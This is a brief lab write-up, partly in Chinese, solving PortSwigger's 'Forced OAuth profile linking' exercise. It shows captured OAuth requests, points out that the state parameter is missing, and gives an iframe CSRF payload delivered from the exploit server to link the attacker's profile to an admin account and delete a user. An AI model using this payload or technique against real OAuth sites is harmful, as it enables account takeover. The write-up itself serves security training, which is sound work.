[Write Up]Lab: Forced OAuth profile linking

2024-12-17
#write-up  #portswigger  #oauth 

Lab description#

Solution#

  1. 使用Login with social media登录peter.wiener:hotdog
  2. 使用Login登录wiener:peter，并点击Attach a social profile
    GET /auth?client_id=dhqow40h55y1b7wcijyyd&redirect_uri=https://0a1a00ed04a832b784b4afba004a0058.web-security-academy.net/oauth-linking&response_type=code&scope=openid%20profile%20email HTTP/2
Host: oauth-0a7f00d004bc32f78428ad89025a0063.oauth-server.net

    HTTP/2 302 Found

Redirecting to <a href="/interaction/0jV25qqAAnNBoeXmkFxdg">/interaction/0jV25qqAAnNBoeXmkFxdg</a>

    GET /interaction/0jV25qqAAnNBoeXmkFxdg HTTP/2
Host: oauth-0a7f00d004bc32f78428ad89025a0063.oauth-server.net

    HTTP/2 200 OK
  3. 请注意上述请求不包含用于防范 CSRF 攻击的 state 参数
  4. 开启Burp Proxy Intercept，并再次点击Attach a social profile，在Burp Proxy Intercept中不断将Request Forward，直到下述Reqest出现，并将之Drop
    GET /oauth-linking?code=475weTD38sy3h-cNaA3iuZCJVu3WULDbyIiXULDbURe HTTP/2
  5. 关闭Burp Proxy Intercept，并回到主页后进行Log out
  6. 点击最上方的Go to exploit server，Body中填入格式为<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>的内容，填写完毕后点击Store、Deliver exploit to victim
  7. 回到主页后通过Login with social media登录，已提权为Admin
  8. 点击右上方Admin panel后点击carlos - Delete 即可解题
